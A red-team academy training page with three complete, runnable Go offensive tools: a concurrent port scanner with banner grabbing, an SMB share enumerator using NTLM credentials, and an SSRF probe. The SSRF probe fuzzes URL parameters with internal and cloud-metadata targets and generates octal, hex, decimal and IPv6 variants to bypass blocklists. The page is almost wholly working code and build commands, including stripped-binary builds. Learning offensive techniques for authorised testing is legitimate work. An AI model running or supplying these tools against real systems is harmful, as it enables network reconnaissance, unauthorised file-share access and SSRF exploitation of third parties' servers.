---
layout: training-page
title: "Go Offensive Tools — Red Team Academy"
module: "Programming"
tags:
  - golang
  - offensive-tools
  - red-team
  - exploitation
page_key: "prog-go-offensive-tools"
render_with_liquid: false
---

# Go Offensive Tools

Three complete, standalone Go programs. Each is a runnable `package main` with all imports listed.
Go's static linking and fast compilation make it ideal for producing single-binary offensive tools
that deploy without runtime dependencies.

---

## Program 1: Concurrent TCP Port Scanner with Banner Grabbing

Concurrently scans a port range using goroutines bounded by a buffered-channel semaphore.
Dials each port with `net.DialTimeout`, sets a read deadline to capture the first 512 bytes of
service banner, and writes results as a table to stdout plus an optional JSON file.

```bash
# Build (stripped, no debug symbols — reduces binary size)
go build -ldflags "-s -w" -o scanner scanner.go

# Usage examples
./scanner -host 192.168.1.1 -ports 1-1024 -concurrency 300 -timeout 1000ms
./scanner -host 10.0.0.5 -ports "22,80,443,3389,8080-8090" -output results.json
./scanner -host 172.16.0.1 -ports 1-65535 -concurrency 500 -timeout 750ms -output full.json
```

```go
// scanner.go
// Build: go build -ldflags "-s -w" -o scanner scanner.go
// Usage: ./scanner -host 192.168.1.1 -ports 1-1024,3389 -concurrency 300
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// PortResult holds scan data for a single open port.
type PortResult struct {
	Port    int           `json:"port"`
	Open    bool          `json:"open"`
	Banner  string        `json:"banner,omitempty"`
	Latency time.Duration `json:"latency_ms"`
}

// parsePorts converts a spec string like "1-1024,3389,8080-8090" into a
// sorted, deduplicated slice of port numbers.
func parsePorts(spec string) ([]int, error) {
	seen := make(map[int]bool)
	for _, part := range strings.Split(spec, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		if strings.Contains(part, "-") {
			bounds := strings.SplitN(part, "-", 2)
			lo, err1 := strconv.Atoi(bounds[0])
			hi, err2 := strconv.Atoi(bounds[1])
			if err1 != nil || err2 != nil || lo < 1 || hi > 65535 || lo > hi {
				return nil, fmt.Errorf("invalid port range: %s", part)
			}
			for p := lo; p <= hi; p++ {
				seen[p] = true
			}
		} else {
			p, err := strconv.Atoi(part)
			if err != nil || p < 1 || p > 65535 {
				return nil, fmt.Errorf("invalid port: %s", part)
			}
			seen[p] = true
		}
	}
	ports := make([]int, 0, len(seen))
	for p := range seen {
		ports = append(ports, p)
	}
	sort.Ints(ports)
	return ports, nil
}

// grabBanner reads up to 512 bytes from conn within 2 seconds.
// Non-printable bytes are replaced with '.' for clean terminal output.
func grabBanner(conn net.Conn) string {
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	if n == 0 {
		return ""
	}
	var sb strings.Builder
	for _, b := range buf[:n] {
		if b >= 0x20 && b < 0x7f {
			sb.WriteByte(b)
		} else if b == '\n' || b == '\r' || b == '\t' {
			sb.WriteByte(' ')
		} else {
			sb.WriteByte('.')
		}
	}
	return strings.TrimSpace(sb.String())
}

// probePort dials a single port and returns a PortResult.
func probePort(host string, port int, timeout time.Duration) PortResult {
	addr    := net.JoinHostPort(host, strconv.Itoa(port))
	start   := time.Now()
	conn, err := net.DialTimeout("tcp", addr, timeout)
	latency := time.Since(start).Truncate(time.Millisecond)

	if err != nil {
		return PortResult{Port: port, Open: false}
	}
	defer conn.Close()

	banner := grabBanner(conn)
	return PortResult{
		Port:    port,
		Open:    true,
		Banner:  banner,
		Latency: latency,
	}
}

func main() {
	host        := flag.String("host", "", "Target host or IP address (required)")
	portSpec    := flag.String("ports", "1-1024", "Port spec, e.g. \"1-1024,3389,8080\"")
	concurrency := flag.Int("concurrency", 300, "Maximum concurrent goroutines")
	timeout     := flag.Duration("timeout", 1000*time.Millisecond, "TCP dial timeout per port")
	output      := flag.String("output", "", "Optional JSON output file path")
	flag.Parse()

	if *host == "" {
		fmt.Fprintln(os.Stderr, "error: -host is required")
		flag.Usage()
		os.Exit(1)
	}

	ports, err := parsePorts(*portSpec)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error parsing ports: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Scanning %-20s  %d ports  concurrency=%d  timeout=%v\n\n",
		*host, len(ports), *concurrency, *timeout)

	var (
		mu      sync.Mutex
		wg      sync.WaitGroup
		results []PortResult
		// Buffered channel acts as counting semaphore
		sem     = make(chan struct{}, *concurrency)
	)

	for _, port := range ports {
		wg.Add(1)
		sem <- struct{}{} // acquire slot
		go func(p int) {
			defer wg.Done()
			defer func() { <-sem }() // release slot

			r := probePort(*host, p, *timeout)
			if r.Open {
				mu.Lock()
				results = append(results, r)
				mu.Unlock()
			}
		}(port)
	}
	wg.Wait()

	// Sort results by port number for readability
	sort.Slice(results, func(i, j int) bool {
		return results[i].Port < results[j].Port
	})

	// Print open-port table to stdout
	fmt.Printf("%-8s %-10s %-8s %s\n", "PORT", "STATE", "LATENCY", "BANNER")
	fmt.Println(strings.Repeat("-", 80))
	for _, r := range results {
		banner := r.Banner
		if len(banner) > 50 {
			banner = banner[:50] + "..."
		}
		fmt.Printf("%-8d %-10s %-8s %s\n",
			r.Port, "open", r.Latency, banner)
	}
	fmt.Printf("\n%d open port(s) found.\n", len(results))

	// Write JSON if requested
	if *output != "" {
		data, err := json.MarshalIndent(results, "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "json marshal error: %v\n", err)
			os.Exit(1)
		}
		if err := os.WriteFile(*output, data, 0600); err != nil {
			fmt.Fprintf(os.Stderr, "write error: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Results written to %s\n", *output)
	}
}
```

**Key design points:**

- Buffered channel `make(chan struct{}, concurrency)` is the idiomatic Go semaphore pattern —
  no external libraries required
- `net.DialTimeout` blocks at OS level without spawning extra goroutines per port
- `SetReadDeadline` prevents banner reads from blocking indefinitely on silent services
- JSON output uses `0600` permissions — scan data may include sensitive service information
- `PortResult.Latency` is truncated to milliseconds via `time.Duration.Truncate`

---

## Program 2: SMB Share Enumerator

Connects to TCP port 445, negotiates SMB2, authenticates with NTLM credentials (or guest), lists
all available shares, and attempts to read the root directory of each accessible share. Results are
printed to stdout and written as JSON.

```bash
# Install the pure-Go SMB2 library
go get github.com/hirochachacha/go-smb2

# Build
go build -ldflags "-s -w" -o smblist smblist.go

# Usage examples
./smblist -host 10.0.0.5 -user administrator -pass 'Password123!' -domain CORP
./smblist -host 10.0.0.5 -user guest -pass '' -domain WORKGROUP -output shares.json
./smblist -host 192.168.1.20 -user 'CORP\jdoe' -pass 'Winter2024' -output enum.json
```

```go
// smblist.go
// Build: go get github.com/hirochachacha/go-smb2 && go build -ldflags "-s -w" -o smblist smblist.go
// Usage: ./smblist -host 192.168.1.1 -user admin -pass 'P@ss!' -domain CORP -output shares.json
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/hirochachacha/go-smb2"
)

// ShareEntry describes a single SMB share and its accessibility.
type ShareEntry struct {
	Name        string   `json:"name"`
	Accessible  bool     `json:"accessible"`
	Files       []string `json:"files,omitempty"`
	AccessError string   `json:"access_error,omitempty"`
}

// ShareReport is the top-level JSON output structure.
type ShareReport struct {
	Host   string       `json:"host"`
	User   string       `json:"user"`
	Shares []ShareEntry `json:"shares"`
}

// dialSMB opens a TCP connection to port 445 and authenticates via SMB2/NTLM.
// Returns the authenticated session and the raw TCP connection (caller must close both).
func dialSMB(host, user, pass, domain string, connTimeout time.Duration) (*smb2.Session, net.Conn, error) {
	addr := net.JoinHostPort(host, "445")
	conn, err := net.DialTimeout("tcp", addr, connTimeout)
	if err != nil {
		return nil, nil, fmt.Errorf("TCP dial to %s: %w", addr, err)
	}

	// NTLMInitiator handles the full NTLM handshake automatically.
	// Domain may be left empty for local account authentication.
	dialer := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     user,
			Password: pass,
			Domain:   domain,
		},
	}

	session, err := dialer.Dial(conn)
	if err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("SMB2 authentication failed: %w", err)
	}
	return session, conn, nil
}

// listRoot mounts a share and lists entries in its root directory.
// Returns up to maxEntries items in the form "[dir] name" or "[file] name".
func listRoot(session *smb2.Session, shareName string, maxEntries int) ([]string, error) {
	fs, err := session.Mount(shareName)
	if err != nil {
		return nil, err
	}
	defer fs.Umount()

	entries, err := fs.ReadDir(".")
	if err != nil {
		return nil, err
	}

	var listing []string
	for i, e := range entries {
		if i >= maxEntries {
			listing = append(listing, fmt.Sprintf("... (truncated at %d entries)", maxEntries))
			break
		}
		kind := "file"
		if e.IsDir() {
			kind = "dir"
		}
		listing = append(listing, fmt.Sprintf("[%s] %s", kind, e.Name()))
	}
	return listing, nil
}

func main() {
	host    := flag.String("host", "", "Target host or IP address (required)")
	user    := flag.String("user", "guest", "SMB username")
	pass    := flag.String("pass", "", "SMB password (empty string for no password)")
	domain  := flag.String("domain", "", "SMB domain or workgroup (empty for local auth)")
	timeout := flag.Duration("timeout", 10*time.Second, "TCP connection timeout")
	output  := flag.String("output", "", "Optional JSON output file path")
	flag.Parse()

	if *host == "" {
		fmt.Fprintln(os.Stderr, "error: -host is required")
		flag.Usage()
		os.Exit(1)
	}

	fmt.Printf("[*] Connecting to %s as %s\\%s ...\n", *host, *domain, *user)

	session, conn, err := dialSMB(*host, *user, *pass, *domain, *timeout)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Connection failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()
	defer session.Logoff()

	fmt.Println("[+] Authentication successful")

	// Retrieve share list via NetShareEnum RPC
	shareNames, err := session.ListSharenames()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Failed to list shares: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Found %d share(s)\n\n", len(shareNames))

	report := ShareReport{
		Host: *host,
		User: fmt.Sprintf("%s\\%s", *domain, *user),
	}

	for _, name := range shareNames {
		entry := ShareEntry{Name: name}

		files, err := listRoot(session, name, 20)
		if err != nil {
			entry.Accessible  = false
			entry.AccessError = err.Error()
		} else {
			entry.Accessible = true
			entry.Files      = files
		}

		report.Shares = append(report.Shares, entry)
	}

	// Print summary table
	fmt.Printf("%-25s %-12s %s\n", "SHARE", "ACCESSIBLE", "CONTENTS / ERROR")
	fmt.Println(strings.Repeat("-", 80))
	for _, s := range report.Shares {
		if s.Accessible {
			fmt.Printf("%-25s %-12s %d item(s)\n", s.Name, "YES", len(s.Files))
			for _, f := range s.Files {
				fmt.Printf("  %s\n", f)
			}
		} else {
			errShort := s.AccessError
			if len(errShort) > 48 {
				errShort = errShort[:48] + "..."
			}
			fmt.Printf("%-25s %-12s %s\n", s.Name, "NO", errShort)
		}
	}
	fmt.Printf("\n%d share(s) enumerated.\n", len(report.Shares))

	// Write JSON output if requested
	if *output != "" {
		data, err := json.MarshalIndent(report, "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "json error: %v\n", err)
			os.Exit(1)
		}
		if err := os.WriteFile(*output, data, 0600); err != nil {
			fmt.Fprintf(os.Stderr, "write error: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] Results written to %s\n", *output)
	}
}
```

**Key design points:**

- `github.com/hirochachacha/go-smb2` is a pure-Go SMB2 implementation — no CGO, cross-compiles
  to any target without native SMB libraries
- `NTLMInitiator` handles the full NTLM challenge/response exchange; set `Domain` to empty string
  for local machine accounts
- `session.ListSharenames()` issues a NetShareEnum RPC under the hood — same as `net view \\host`
- `fs.ReadDir(".")` reads the share root; change the path string to enumerate deeper
- JSON is written with mode `0600` since share listings may reveal sensitive file names

---

## Program 3: HTTP SSRF Probe

Tests a URL parameter for Server-Side Request Forgery vulnerabilities. Replaces a `FUZZ`
placeholder in the URL with each wordlist entry and automatically generates bypass variants
(decimal IP, octal IP, hex IP, and IPv6 short-form). Compares response size and HTTP status
to a baseline to flag anomalies. Hits are written to a JSON output file.

```bash
# Build
go build -ldflags "-s -w" -o ssrfprobe ssrfprobe.go

# Usage: FUZZ in the URL template is replaced with each wordlist payload
./ssrfprobe --url "https://target.com/fetch?url=FUZZ" \
            --wordlist ssrf-payloads.txt \
            --threads 20 --timeout 8s --output hits.json

# Example payload file entries
# http://169.254.169.254/latest/meta-data/
# http://127.0.0.1/admin
# http://192.168.1.1/
```

```go
// ssrfprobe.go
// Build: go build -ldflags "-s -w" -o ssrfprobe ssrfprobe.go
// Usage: ./ssrfprobe --url "https://target.com/api?u=FUZZ" --wordlist payloads.txt --threads 15
package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Hit records a response that differs significantly from the baseline.
type Hit struct {
	Payload        string `json:"payload"`
	URL            string `json:"url"`
	StatusCode     int    `json:"status_code"`
	ContentLength  int64  `json:"content_length"`
	BaselineStatus int    `json:"baseline_status"`
	BaselineLength int64  `json:"baseline_length"`
	Reason         string `json:"reason"`
}

// buildHTTPClient returns a client that does not follow redirects and skips TLS verification.
// SSRF often reveals itself via redirects to internal endpoints, so we capture them instead.
func buildHTTPClient(timeout time.Duration) *http.Client {
	return &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // stop after first redirect; inspect the Location header
		},
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
			DisableKeepAlives: false,
		},
	}
}

// sendProbe issues a GET request and returns the response status and body byte count.
func sendProbe(client *http.Client, targetURL string) (int, int64, error) {
	resp, err := client.Get(targetURL)
	if err != nil {
		return 0, 0, err
	}
	defer resp.Body.Close()
	n, _ := io.Copy(io.Discard, resp.Body)
	return resp.StatusCode, n, nil
}

// isAnomaly compares a probe result to the baseline.
// Returns (true, reason) when the response looks meaningfully different.
// Thresholds: any status change, or >100 byte body size difference.
func isAnomaly(status int, length int64, baseStatus int, baseLength int64) (bool, string) {
	if status != baseStatus && baseStatus != 0 {
		return true, fmt.Sprintf("status changed %d→%d", baseStatus, status)
	}
	diff := length - baseLength
	if diff < 0 {
		diff = -diff
	}
	if diff > 100 {
		return true, fmt.Sprintf("body size changed %d→%d (Δ%d bytes)", baseLength, length, diff)
	}
	return false, ""
}

// ipToBypasses converts a dotted-quad IPv4 string (e.g. "127.0.0.1") into
// alternative representations used to bypass naive SSRF blocklists:
//
//   - Decimal:     2130706433
//   - Octal:       0177.0.0.1
//   - Hex:         0x7f000001
//   - IPv6 mapped: ::ffff:127.0.0.1
//   - IPv6 short:  ::1  (loopback only)
//
// Returns the original string if parsing fails.
func ipToBypasses(ip string) []string {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return []string{ip}
	}
	octets := make([]uint64, 4)
	for i, p := range parts {
		v, err := strconv.ParseUint(p, 10, 64)
		if err != nil {
			return []string{ip}
		}
		octets[i] = v
	}
	decimal := octets[0]<<24 | octets[1]<<16 | octets[2]<<8 | octets[3]
	octal   := fmt.Sprintf("0%o.0%o.0%o.0%o", octets[0], octets[1], octets[2], octets[3])
	hexIP   := fmt.Sprintf("0x%08x", decimal)

	bypasses := []string{
		ip,
		fmt.Sprintf("%d", decimal),
		octal,
		hexIP,
		fmt.Sprintf("::ffff:%s", ip),
	}
	// For loopback, also include the short IPv6 form
	if ip == "127.0.0.1" {
		bypasses = append(bypasses, "::1")
	}
	return bypasses
}

// expandPayload takes a raw payload (e.g. "http://127.0.0.1/admin") and returns
// a slice of variant URLs using bypass representations of any embedded IPv4 address.
func expandPayload(raw string) []string {
	// Extract the host portion from a URL-like string for bypass generation.
	// We look for "://" and split on "/" or ":" after the host.
	variants := []string{raw}

	start := strings.Index(raw, "://")
	if start == -1 {
		return variants
	}
	hostPart := raw[start+3:]
	endSlash := strings.Index(hostPart, "/")
	endColon := strings.Index(hostPart, ":")
	end := len(hostPart)
	if endSlash >= 0 && endSlash < end {
		end = endSlash
	}
	if endColon >= 0 && endColon < end {
		end = endColon
	}
	host := hostPart[:end]

	// Only expand if it looks like an IPv4 address
	if strings.Count(host, ".") != 3 {
		return variants
	}

	bypasses := ipToBypasses(host)
	for _, bypass := range bypasses {
		if bypass == host {
			continue // already in variants as the raw URL
		}
		variant := raw[:start+3] + bypass + hostPart[end:]
		variants = append(variants, variant)
	}
	return variants
}

// loadWordlist reads a text file and returns non-empty, non-comment lines.
func loadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		lines = append(lines, line)
	}
	return lines, scanner.Err()
}

func main() {
	urlTemplate := flag.String("url", "", "Target URL with FUZZ placeholder (required)")
	wordlistPath := flag.String("wordlist", "", "Path to SSRF payload wordlist (required)")
	threads      := flag.Int("threads", 10, "Number of concurrent worker goroutines")
	timeout      := flag.Duration("timeout", 8*time.Second, "HTTP request timeout")
	outputPath   := flag.String("output", "", "Optional JSON file to write hits to")
	flag.Parse()

	if *urlTemplate == "" || *wordlistPath == "" {
		fmt.Fprintln(os.Stderr, "error: --url and --wordlist are required")
		flag.Usage()
		os.Exit(1)
	}
	if !strings.Contains(*urlTemplate, "FUZZ") {
		fmt.Fprintln(os.Stderr, "error: --url must contain the literal string FUZZ")
		os.Exit(1)
	}

	payloads, err := loadWordlist(*wordlistPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error reading wordlist: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[*] Loaded %d base payloads from %s\n", len(payloads), *wordlistPath)

	client := buildHTTPClient(*timeout)

	// Establish baseline using a guaranteed-NXDOMAIN address so any real
	// internal response is immediately distinguishable.
	baseURL := strings.ReplaceAll(*urlTemplate, "FUZZ", "http://ssrf-baseline-nxdomain.invalid/")
	fmt.Printf("[*] Baseline URL: %s\n", baseURL)
	baseStatus, baseLength, baseErr := sendProbe(client, baseURL)
	if baseErr != nil {
		fmt.Printf("[*] Baseline error (treating as 0/0): %v\n", baseErr)
		baseStatus = 0
		baseLength = 0
	} else {
		fmt.Printf("[*] Baseline: status=%d length=%d\n\n", baseStatus, baseLength)
	}

	// Expand payloads with bypass variants
	type job struct {
		payload string
		probeURL string
	}
	var jobs []job
	for _, p := range payloads {
		for _, variant := range expandPayload(p) {
			probeURL := strings.ReplaceAll(*urlTemplate, "FUZZ", variant)
			jobs = append(jobs, job{payload: p, probeURL: probeURL})
		}
	}
	fmt.Printf("[*] Total probe URLs (including bypass variants): %d\n", len(jobs))
	fmt.Printf("[*] Threads: %d  Timeout: %v\n\n", *threads, *timeout)

	var (
		mu   sync.Mutex
		wg   sync.WaitGroup
		hits []Hit
		sem  = make(chan struct{}, *threads)
	)

	for _, j := range jobs {
		wg.Add(1)
		sem <- struct{}{}
		go func(pl, pu string) {
			defer wg.Done()
			defer func() { <-sem }()

			status, length, err := sendProbe(client, pu)
			if err != nil {
				// Network errors (refused, timeout) are expected for invalid internal addresses
				return
			}

			anomaly, reason := isAnomaly(status, length, baseStatus, baseLength)
			if anomaly {
				h := Hit{
					Payload:        pl,
					URL:            pu,
					StatusCode:     status,
					ContentLength:  length,
					BaselineStatus: baseStatus,
					BaselineLength: baseLength,
					Reason:         reason,
				}
				mu.Lock()
				hits = append(hits, h)
				mu.Unlock()
				fmt.Printf("[HIT] %-50s  status=%d length=%d  reason=%s\n",
					pl, status, length, reason)
			}
		}(j.payload, j.probeURL)
	}
	wg.Wait()

	fmt.Printf("\n[+] Done. %d anomalous response(s) from %d probes.\n",
		len(hits), len(jobs))

	if *outputPath != "" && len(hits) > 0 {
		data, err := json.MarshalIndent(hits, "", "  ")
		if err != nil {
			fmt.Fprintf(os.Stderr, "json error: %v\n", err)
			os.Exit(1)
		}
		if err := os.WriteFile(*outputPath, data, 0600); err != nil {
			fmt.Fprintf(os.Stderr, "write error: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] Hits written to %s\n", *outputPath)
	} else if *outputPath != "" {
		fmt.Println("[*] No hits to write.")
	}
}
```

**Key design points:**

- `expandPayload` generates bypass representations for every IPv4 address found in a payload URL:
  decimal (`2130706433`), octal (`0177.0.0.1`), hex (`0x7f000001`), IPv6-mapped
  (`::ffff:127.0.0.1`), and short-form IPv6 (`::1` for loopback) — blocklist bypass coverage
  without requiring the wordlist author to pre-enumerate all forms
- `http.ErrUseLastResponse` stops redirect following — SSRF often manifests as a redirect to an
  internal URL with the Location header exposing the internal address
- Anomaly detection threshold is 100 bytes to avoid false positives from minor dynamic content
  differences while still catching non-trivial internal response bodies
- Baseline uses a guaranteed-NXDOMAIN hostname so any successful probe to an internal address
  produces a detectably different response
- Semaphore pattern with buffered channel avoids importing external concurrency libraries

---

## Resources

- Go standard library — net/http: https://pkg.go.dev/net/http
- Go standard library — net (DialTimeout): https://pkg.go.dev/net#DialTimeout
- go-smb2 (hirochachacha) — pure-Go SMB2 library: https://github.com/hirochachacha/go-smb2
- golang.org/x/sys — low-level OS interfaces: https://pkg.go.dev/golang.org/x/sys
- golang.org/x/sys/windows — Windows-specific syscalls: https://pkg.go.dev/golang.org/x/sys/windows
- Go cross-compilation guide: https://pkg.go.dev/cmd/go#hdr-Environment_variables
- OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
